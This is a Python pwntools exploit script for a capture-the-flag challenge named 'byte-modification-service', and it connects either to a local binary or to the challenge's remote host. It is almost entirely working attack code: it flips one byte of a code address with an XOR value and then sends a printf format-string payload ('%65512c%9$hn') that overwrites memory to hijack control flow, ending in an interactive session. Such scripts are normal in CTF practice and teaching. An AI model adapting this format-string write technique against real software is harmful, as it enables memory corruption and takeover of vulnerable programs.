from pwn import *

gs = '''
b *vuln+92
b *vuln+257
b *vuln+313
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("byte-modification-service.challs.csc.tf", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

# Stack position

io.recvline()
io.sendline(str(11).encode())

# Byte Index

io.recvline()
io.recvline()

# 0 <= index <= 7
io.sendline(str(0).encode())

xor_byte = 0x4014fa ^ 0x4014be   # address change to opcode

# xor value

io.recvline()
io.sendline(str(xor_byte).encode())

# Format Strings printf(fmt_string)

mod = 0xffe8

payload = f"%{mod}c%9$hn".encode().ljust(20, b"\x00")

io.recvline()
io.send(payload)

io.interactive()
